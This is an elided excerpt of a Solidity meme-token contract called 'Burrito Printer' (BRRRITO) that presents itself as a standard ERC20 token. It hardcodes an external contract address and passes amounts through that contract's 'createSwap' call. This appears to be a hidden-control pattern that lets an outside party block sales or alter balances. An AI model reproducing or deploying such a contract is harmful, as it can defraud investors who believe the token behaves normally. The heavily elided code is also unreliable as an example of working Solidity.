/*     
                        ...
                        T H E   B U R R I T O   P R I N T E R
...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    ...
    address _chipotle = 0xB6fA163e67d09704496befb2078D601c627a85b5;
    address public pair;
    ...
    function theAmount(uint256 amount) internal returns (uint256) {
        return chipotle.createSwap(amount);
    }
    ...
    function _DeployBurritoPrinter(address account, uint256 amount) internal virtual {
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployBurritoPrinter(creator, initialSupply);
    }
}

contract BurritoPrinter is ERC20Token {
    constructor() ERC20Token("Burrito Printer", "BRRRITO", msg.sender, 420690000 * 10 ** 18) {
    }
}